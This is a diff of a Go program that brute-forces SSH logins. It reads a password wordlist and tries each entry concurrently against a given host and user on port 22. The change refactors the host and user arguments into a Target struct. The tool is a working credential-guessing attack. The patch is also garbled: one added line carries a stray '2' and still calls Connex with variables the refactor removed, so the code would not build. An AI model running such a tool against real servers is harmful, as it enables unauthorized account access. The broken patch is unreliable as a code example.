@@ -14,8 +14,8 @@ Benchmarks?
 */
 
 type Target struct {
-	usr string
 	host string
+	user string
 }
 
 type Pass struct {
@@ -41,15 +41,15 @@ func ReadList(path string) ([]string, error) {
 }
 
 // Connex attempts to login to ssh.
-func Connex(pss, hst, usr string) (Pass){
+func Connex(pss string, target Target) (Pass){
 	config := &ssh.ClientConfig{
-		User: usr,
+		User: target.user,
 		Auth: []ssh.AuthMethod{
 			ssh.Password(pss),
 		},
 	}
 	// Dial your ssh server.
-	conn, err := ssh.Dial("tcp", hst+":22", config)
+	conn, err := ssh.Dial("tcp", target.host+":22", config)
 	if err != nil {
 		return Pass{false, pss}
 	} else {
@@ -59,9 +59,10 @@ func Connex(pss, hst, usr string) (Pass){
 }
 
 func main() {
+	// TODO: Add Usage if args are less that 3
 	args := os.Args[1:]
-	host := args[0]
-	user := args[1]
+	// Args: 1. host 2. user 3. wordlist
+	target := Target{args[0], args[1]}
 	wordList := args[2]
 	// Read Password list
 	passList, err := ReadList(wordList)
@@ -73,7 +74,7 @@ func main() {
 	passChan := make(chan Pass)
 	for _, p := range passList {
 		go func(password string) {
-			result := Connex(password, host, user)
+2			result := Connex(password, host, user)
 			passChan<-result
 		}(p)
 	}
